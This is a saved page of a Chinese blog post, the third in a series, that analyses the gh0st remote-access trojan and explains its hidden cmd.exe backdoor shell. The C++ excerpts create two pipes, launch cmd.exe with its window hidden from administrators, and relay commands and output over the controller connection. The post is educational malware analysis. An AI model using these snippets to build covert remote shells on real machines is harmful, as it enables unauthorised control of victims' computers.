@@ -1,0 +1,428 @@
+
+<!DOCTYPE html>
+
+<html lang="en">
+<head>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="True" name="HandheldFriendly"/>
+<meta content="width=device-width, initial-scale=1, maximum-scale=1" name="viewport">
+<meta content="phithon的小站，长期存在与分享关于网络安全与各种编程的原创文章。" name="description"/>
+<meta content="网络安全,代码审计,信息安全,漏洞挖掘,php,C++,mysql,python" name="keywords"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/favicon.ico" rel="shortcut icon"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/favicon-192x192.png" rel="icon" sizes="192x192" type="image/png"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/apple-touch-icon.png" rel="apple-touch-icon" sizes="180x180"/>
+<title>gh0st源码分析与远控的编写(三) | 离别歌</title>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/font-awesome.min.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/styles.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/style.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/flexboxgrid.min.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/feed" rel="alternate" title="离别歌" type="application/atom+xml">
+<script src="./gh0st源码分析与远控的编写(三)  离别歌/jquery.min.js"></script>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/code.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/button.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/pagination.css" rel="stylesheet"/>
+<link href="./gh0st源码分析与远控的编写(三)  离别歌/jquery.fancybox.min.css" rel="stylesheet"/>
+</link></meta></head>
+<body>
+<div id="header-post">
+<a class="active" href="#" id="menu-icon"><i class="fa fa-bars fa-lg"></i></a>
+<a class="active" href="#" id="menu-icon-tablet"><i class="fa fa-bars fa-lg"></i></a>
+<a href="#" id="top-icon-tablet" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
+<span id="menu" style="visibility: visible">
+<span id="nav">
+<ul>
+<li><a href="/">主页</a></li>
+<li><a href="javascript:history.back(-1)">返回</a></li>
+</ul>
+</span>
+<br/>
+<span id="actions">
+<ul>
+<li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i aria-hidden="true" class="fa fa-chevron-up" onmouseout="$('#i-top').toggle();" onmouseover="$('#i-top').toggle();"></i></a></li>
+<li><a class="icon" href="#"><i aria-hidden="true" class="fa fa-share-alt" onclick="$('#share').toggle();return false;" onmouseout="$('#i-share').toggle();" onmouseover="$('#i-share').toggle();"></i></a></li>
+</ul>
+<span class="info" id="i-top" style="display:none;">Back to top</span>
+<span class="info" id="i-share" style="display:none;">Share post</span>
+</span>
+<br/>
+<div id="share" style="display: none">
+<ul>
+<li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3A//www.leavesongs.com/C/gh0st_3.html"><i aria-hidden="true" class="fa fa-facebook "></i></a></li>
+<li><a class="icon" href="https://twitter.com/share?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;text=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29"><i aria-hidden="true" class="fa fa-twitter "></i></a></li>
+<li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29"><i aria-hidden="true" class="fa fa-linkedin "></i></a></li>
+<li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;is_video=false&amp;description=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29"><i aria-hidden="true" class="fa fa-pinterest "></i></a></li>
+<li><a class="icon" href="mailto:?subject=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29&amp;body=Check out this article: https%3A//www.leavesongs.com/C/gh0st_3.html"><i aria-hidden="true" class="fa fa-envelope "></i></a></li>
+<li><a class="icon" href="https://getpocket.com/save?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29"><i aria-hidden="true" class="fa fa-get-pocket "></i></a></li>
+<li><a class="icon" href="http://reddit.com/submit?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29"><i aria-hidden="true" class="fa fa-reddit "></i></a></li>
+<li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29"><i aria-hidden="true" class="fa fa-stumbleupon "></i></a></li>
+<li><a class="icon" href="http://digg.com/submit?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;title=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29"><i aria-hidden="true" class="fa fa-digg "></i></a></li>
+<li><a class="icon" href="http://www.tumblr.com/share/link?url=https%3A//www.leavesongs.com/C/gh0st_3.html&amp;name=gh0st%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90%E4%B8%8E%E8%BF%9C%E6%8E%A7%E7%9A%84%E7%BC%96%E5%86%99%28%E4%B8%89%29&amp;description="><i aria-hidden="true" class="fa fa-tumblr "></i></a></li>
+</ul>
+</div>
+</span>
+</div>
+<div class="content index width mx-auto px2 my4">
+<article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+<header>
+<h1 class="posttitle" itemprop="name headline">gh0st源码分析与远控的编写(三)</h1>
+<div class="meta">
+<span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+<span itemprop="name">Phithon</span>
+</span>
+<div class="postdate">
+<time datetime="2013年7月12日 17:01" itemprop="datePublished">
+                    2013 七月 12 17:01
+                </time>
+</div>
+<div class="article-tag">
+            阅读：8949
+            </div>
+<div class="article-tag">
+<i class="fa fa-bookmark"></i>
+<a class="tag-link" href="/sort/C">C/C++</a>
+</div>
+<div class="article-tag">
+<i class="fa fa-tag"></i>
+<a class="tag-link" href="/tag/gh0st">gh0st</a>,
+                
+                <a class="tag-link" href="/tag/%E8%BF%9C%E6%8E%A7">远控</a>
+</div>
+</div>
+</header>
+<div class="content" itemprop="articleBody">
+<p>
+	    好久不见。距离上次写gh0st来有好久了，一是期末考试，忙不开，二是后来电脑坏了，几天没能上网。
+</p>
+<p>
+	    昨天总算是把电脑修好了，虽说没到一切重头开始的地步，但是也重装各种东西花了很久。闲下来的时间，我就来继续分析gh0st的源码吧。
+</p>
+<p>
+	    上次我们把gh0st的上线给研究了一下，跟着老狼的视频，继续我们的步伐。开始实现gh0st中具体的功能。最简单的一个是“终端管理”，就是一个cmdshell。
+</p>
+<p>
+	    什么是cmdshell，相当于是一个cmd命令行的后门，我在主控端中写下cmd命令，然后传给被控端，被控端执行后将结果再发给主控端。
+</p>
+<p>
+	    这是整个远控中比较简单的部分，我们从被控端开始看起：（源码在附件中可以下载）
+</p>
+<hr/>
+<p>
+	    在MainDll工程中，打开类视图，找到CShellManager这个类，这就是我们“终端管理”功能用到的类。
+</p>
+<p>
+	    在看代码之前，我先说一下cmdshell的原理。为什么我们这个程序能执行cmd命令并且把执行结果得到并返回。这里用到管道技术，管道是为了进程间通信而存在的，如下图：
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201307/f9961373622704.jpg" id="ematt:151" target="_blank"><img alt="03.jpg" border="0" height="236" src="./gh0st源码分析与远控的编写(三)  离别歌/thum-f9961373622704.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    我们在gh0st进程中，开启一个cmd进程，并使用管道，向cmd.exe传送信息，而cmd.exe也利用管道将信息发送给gh0st的进程。管道通信又分三种，双管道、单管道与无管道。gh0st里面用的双管道后门，也就是说，我们在gh0st.exe和cmd.exe之间建立了两根传输数据的管道，原因可想而知：a管道接受gh0st的命令，并发送给cmd，b管道接受cmd的执行结果，并发送给gh0st。
+</p>
+<p>
+	    理解了这个就方便了。首先看到它的构造函数：
+</p>
+<pre class="brush: cpp;auto-links: false;">	if (!CreatePipe(&amp;m_hReadPipeShell, &amp;m_hWritePipeDll, &amp;sa, 0)) //该管道为程序写，cmd读
+	{
+		CloseHandle(m_hReadPipeShell);
+		CloseHandle(m_hWritePipeDll);
+		return ;
+	}
+
+	if (!CreatePipe(&amp;m_hReadPipeDll, &amp;m_hWritePipeShell, &amp;sa, 0)) //该管道为cmd写，程序读
+	{
+		CloseHandle(m_hReadPipeDll);
+		CloseHandle(m_hWritePipeShell);
+	}</pre>
+<br>
+    创建了两根管道，使用的API就是CreatePipe，m_hReadPipeShell其实就是一个句柄。CreatePipe这个API前两个参数是该管道的读句柄和写句柄。读句柄就是该管道的入口，写句柄就是该管道的出口。管道这个名字很恰当，就像一根管子，数据从一个方向流入，从另一个方向流出。
+<p>
+<br>
+</br></p>
+<p>
+	    sa是安全属性的一个结构，没有太大作用，初始化一下传入地址进去就行了。
+</p>
+<p>
+	    再往下看，
+</p>
+<pre class="brush: cpp;auto-links: false;">	//获得当前程序的相关信息
+	GetStartupInfo(&amp;si);
+	si.cb = sizeof(STARTUPINFO);
+	si.wShowWindow = SW_HIDE;  //将进程属性设置为隐藏，否则cmd一打开管理员就看到了
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si.hStdInput = m_hReadPipeShell; //将cmd读、写句柄赋值给该参数
+	si.hStdOutput = m_hWritePipeShell;
+	si.hStdError = m_hWritePipeShell;
+
+	GetSystemDirectoryA(szShellPath, MAX_PATH);
+	strcat_s(szShellPath, MAX_PATH, "\\cmd.exe");
+
+	if (!CreateProcess(szShellPath, NULL, NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS, NULL, NULL, &amp;si, &amp;pi))
+	{
+		CloseHandle(m_hReadPipeDll);
+		CloseHandle(m_hWritePipeDll);
+		CloseHandle(m_hReadPipeShell);
+		CloseHandle(m_hWritePipeShell);
+		return;
+	}</pre>
+<p>
+	    这部分实际上是在创建一个进程。创建cmd进程，使用的函数是CreateProccess，在创建进程之前，首先要设置一下该进程的属性(使用到STARTUPINFO结构，)。GetStartupInfo(&amp;si)就是获取本进程的属性。相当于用本进程的属性初始化了cmd进程的属性，然后再改一改，看看注释就知道了。
+</p>
+<p>
+	    到此，创建了一个进程(cmd.exe)和两根管道了。然后我们可以看到，被控端执行了这一条命令：Send((LPBYTE)&amp;bToken, 1); 发送了这个参数：TOKEN_SHELL_START给主控端。这就告诉主控端，一切就绪，可以开始使用了。
+</p>
+<p>
+	    之后打开两个线程，一个是读取管道数据，一个是等待管道关闭。
+</p>
+<p>
+	    看到读取管道数据的线程，主要内容是一个死循环：
+</p>
+<pre class="brush: cpp;auto-links: false;">	while (true)
+	{
+		Sleep(100);
+		while (PeekNamedPipe(pThis-&gt;m_hReadPipeDll, ReadBuffer, sizeof(ReadBuffer), 
+			&amp;ByteRead, &amp;TotalByteAvail, NULL))
+		{
+			if (ByteRead &lt;= 0)
+			{
+				break;
+			}
+			ZeroMemory(&amp;ByteRead, sizeof(ByteRead));
+			LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, TotalByteAvail); //LocalAlloc函数从堆中分配指定大小的区域
+			//读取管道内信息
+			ReadFile(pThis-&gt;m_hReadPipeDll, lpBuffer, TotalByteAvail, &amp;ByteRead, NULL);
+			//发送数据
+			pThis-&gt;Send(lpBuffer, TotalByteAvail);
+			LocalFree(lpBuffer);
+		}
+	}</pre>
+    其中用到PeekNamedPipe这个API，它的作用就是向管道中看一眼，如果有数据则返回True，如果没有则返回FALSE。也就是说，如果没有数据，这个线程就一直在外部那个循环中，不停sleep。直到有数据就进入内部循环。ByteRead是数据的大小，如果它为0则表示cmd.exe已经关闭了，就break然后退到外层循环，再一直sleep。如果有内容我们就使用ReadFile读取管道中内容，并Send到主控端去。
+<p>
+<br/>
+</p>
+<p>
+	    说到这里，有些人就要问了。你只说了怎么从管道里读取内容发送给主控端，但我们被控端怎么从主控端接收内容并发送给管道呢？
+</p>
+<p>
+	    上节课最后我们说了，“OnReceive函数在CManager中定义，但并未实现”。我们在这个文件中搜索一个OnRecieve，发现了它的实现：
+</p>
+<pre class="brush: cpp;auto-links: false;">void CShellManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
+{
+	if (nSize == 1 &amp;&amp; lpBuffer[0] == COMMAND_NEXT)
+	{
+		NotifyDialogIsOpen();
+		return ;
+	}
+
+	//将客户端发来的信息传入管道中
+	unsigned long ByteWrite;
+	WriteFile(m_hWritePipeDll, lpBuffer, nSize, &amp;ByteWrite, NULL);
+}</pre>
+<br/>
+    这就是面向对象的思想。我们所有的CXXXManager其实都是继承的CManeger，而CManager中有这个函数，不过是一个虚函数，没有具体代码。而在我们每个的CXXXManager具体类中，就将其实现。
+<p>
+<br/>
+</p>
+<p>
+	    我们看看其代码。实际上是判断传进来的消息，如果是COMMAND_NEXT，说明主控端执行完毕，被控端执行下一步。如果不是COMMAND_NEXT，说明发送来的信息是数据(命令)。我们就将发来的信息传入管道。
+</p>
+<p>
+	    被控端大致就是这些，我们再看主控端。主控端的一些界面的代码我就不讲了，大家有兴趣可以自己看看。
+</p>
+<p>
+	    <a href="https://www.leavesongs.com/content/uploadfile/201307/2de41373625795.jpg" id="ematt:153" target="_blank"><img alt="04.jpg" border="0" height="280" src="./gh0st源码分析与远控的编写(三)  离别歌/thum-2de41373625795.jpg" title="点击查看原图" width="420"/></a>
+</p>
+<p>
+	    主控端是这样一个思路。首先，用户点击“终端管理”的按钮，然后主控端向被控端发送一条消息，告诉被控端开始终端管理工作，然后被控端新建一个CShellManager类，在类的构造函数里创建两个管道和一个cmd进程。并在最后发送一个<span>TOKEN_SHELL_START命令给主控端(还记得吗？)，主控端接受到此命令后，便建立一个CShellDlg类，并打开相应对话框。</span>
+</p>
+<p>
+	    在类视图中找到CShellDlg这个类，这就是我们的远程管理窗口的类。我们看到其构造函数中发送了一个COMMAND_NEXT给被控端，还记得我们刚才看的OnReceive函数吗，那个if语句就是处理这个消息。就是告诉被控端，一切就绪。
+</p>
+<p>
+	    我们再打开CPhRemoteDlg类，找到其中的ProccessReceiveComplete函数，其中有一段：
+</p>
+<pre class="brush: cpp;auto-links: false;">		case SHELL_DLG:
+			((CShellDlg *)dlg)-&gt;OnReceiveComplete();
+			break;</pre>
+    就是调用了CShellDlg类中的OnRecieveComplete方法，意思就是接收到信息就调用这个方法。
+<p>
+<br/>
+</p>
+<p>
+	    找到这个方法，实际上就是将从socket接受的信息放入编辑框。
+</p>
+<p>
+	    再看到PreTranslateMessage方法，它截获一些消息，包括了按键的消息。注释写的很详细，其实就是，当用户按下回车时，将编辑框中所有文本都保存在字符串中，并减去上一次的长度，得到用户新输入的长内容，作为命令，发送出去。
+</p>
+<hr/>
+<p>
+	    其实主体内容就这么多，所以说cmdshell是gh0st中比较简单的部分了。大家看了这篇文章，大概就知道gh0st源码的一个运行过程了。其他的功能其实发送信息的过程也类似，互相确认一下执行是否成功，并开始发送、接收信息。
+</p>
+</br></div>
+</article>
+<div id="reply-list">
+<h1>评论</h1>
+<div class="row" id="comment-2282">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(三)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">荷兰bowl</a>
+<time datetime="2016年1月13日 15:57" itemprop="datePublished">
+                            2016 一月 13 15:57
+                        </time>
+<a href="javascript:reply_to('2282', '荷兰bowl')">回复</a>
+</p>
+<p class="comment-meta">读取管道数据的线程中<br/>ZeroMemory(&amp;ByteRead, sizeof(ByteRead));<br/>这一句不对吧？</p>
+</div>
+</div>
+<div class="row" id="comment-1552">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(三)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">s0f</a>
+<time datetime="2014年2月27日 13:57" itemprop="datePublished">
+                            2014 二月 27 13:57
+                        </time>
+<a href="javascript:reply_to('1552', 's0f')">回复</a>
+</p>
+<p class="comment-meta">支持博主 继续写下去，文章写的不错！</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1553">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(三)  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年2月27日 13:58" itemprop="datePublished">
+                            2014 二月 27 13:58
+                        </time>
+<a href="javascript:reply_to('1553', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@s0f：真心感谢！</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1548">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(三)  离别歌/d41d8cd98f00b204e9800998ecf8427e.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">毛猴</a>
+<time datetime="2014年2月24日 11:24" itemprop="datePublished">
+                            2014 二月 24 11:24
+                        </time>
+<a href="javascript:reply_to('1548', '毛猴')">回复</a>
+</p>
+<p class="comment-meta">接着写啊</p>
+</div>
+</div>
+<div class="child-node">
+<div class="row" id="comment-1549">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(三)  离别歌/c4267eb6d17276fa31c547ac71611e90.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="http://www.leavesongs.com/" target="_blank">phithon</a>
+<time datetime="2014年2月24日 22:20" itemprop="datePublished">
+                            2014 二月 24 22:20
+                        </time>
+<a href="javascript:reply_to('1549', 'phithon')">回复</a>
+</p>
+<p class="comment-meta">@毛猴：是，会的，近期会放下手里的事继续写gh0st</p>
+</div>
+</div>
+</div>
+<div class="row" id="comment-1540">
+<div class="col-xs-2 col-sm-1 gravatar">
+<img alt="" src="./gh0st源码分析与远控的编写(三)  离别歌/9aebeb8366c8d9a6e2788e89f5001c9b.jpgs=100&amp;d=mm&amp;r=g" width="100%"/>
+</div>
+<div class="col-xs-10 col-sm-11">
+<p class="comment-meta title">
+<a href="" target="_blank">czBen</a>
+<time datetime="2014年1月8日 14:41" itemprop="datePublished">
+                            2014 一月 08 14:41
+                        </time>
+<a href="javascript:reply_to('1540', 'czBen')">回复</a>
+</p>
+<p class="comment-meta">楼主文章写的不错啊， 最近我也在看gh0st的源码。</p>
+</div>
+</div>
+</div>
+<form action="#reply" enctype="multipart/form-data" id="reply" method="post">
+<textarea cols="40" id="id_content" name="content" required="" rows="6">
+</textarea>
+<div class="row">
+<div class="col-xs-4">
+<input id="id_nickname" maxlength="64" name="nickname" placeholder="昵称" required="" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_email" maxlength="254" name="email" placeholder="邮箱（可留空）" type="text"/>
+</div>
+<div class="col-xs-4">
+<input id="id_url" maxlength="200" name="url" placeholder="链接（可留空）" type="text"/>
+</div>
+</div>
+<div class="row" style="margin-top: 8px"><div class="col-xs-4"><input autocomplete="off" id="id_captcha_1" name="captcha_1" placeholder="验证码" type="text"/> <input id="id_captcha_0" name="captcha_0" type="hidden" value="1a3000256d71084bcc63c544309dcd5c35f9c4a8"/>
+</div><div class="col-xs-4">
+<img alt="captcha" class="captcha" height="25" src="./gh0st源码分析与远控的编写(三)  离别歌/1a3000256d71084bcc63c544309dcd5c35f9c4a8"/></div></div>
+<div class="clearfix"></div>
+<input class="ui-button ui-button-sgreen" type="submit" value="提交"/>
+<input id="id_archive" name="archive" type="hidden" value="265">
+<input id="id_parent" name="parent" type="hidden"/>
+<input name="csrfmiddlewaretoken" type="hidden" value="7k2ZQqxfmX41Uvnl7ndOf5VKRCIZxrCjFEnvEUJuNKYqUaLAVEHyOJXP0Gb7gVrt"/>
+</input></form>
+</div>
+<footer id="footer">
+<div class="footer-left">
+    Copyright © 2017 Powered by talkbook
+  </div>
+<div class="footer-right">
+<nav>
+<ul>
+<li><a href="/">首页</a></li>
+<li><a href="http://weibo.com/101yx" target="_blank">微博</a></li>
+<li><a href="https://github.com/phith0n" target="_blank">项目</a></li>
+<li><a href="/template/change/">更换模板</a></li>
+</ul>
+</nav>
+</div>
+</footer>
+<script src="./gh0st源码分析与远控的编写(三)  离别歌/main.js"></script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?ad9ab5e37c2811b9f0979e46123fc898";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+<script src="./gh0st源码分析与远控的编写(三)  离别歌/jquery.fancybox.pack.js"></script>
+<script>
+$(document).ready(function () {
+    $("article a").each(function (i, e) {
+        if(e.host != 'www.leavesongs.com') {
+            e.target = '_blank';
+        }
+    });
+    $("article img").each(function (i, e) {
+        if(e.parentNode.tagName.toUpperCase() != 'A') {
+            $(e).wrap('<a href="'+escapeHtml(e.src)+'" class="fancybox"></a>');
+        } else {
+            $(e.parentNode).addClass('fancybox');
+        }
+    });
+    $('.fancybox').fancybox();
+})
+</script>
+</body>
+</html>
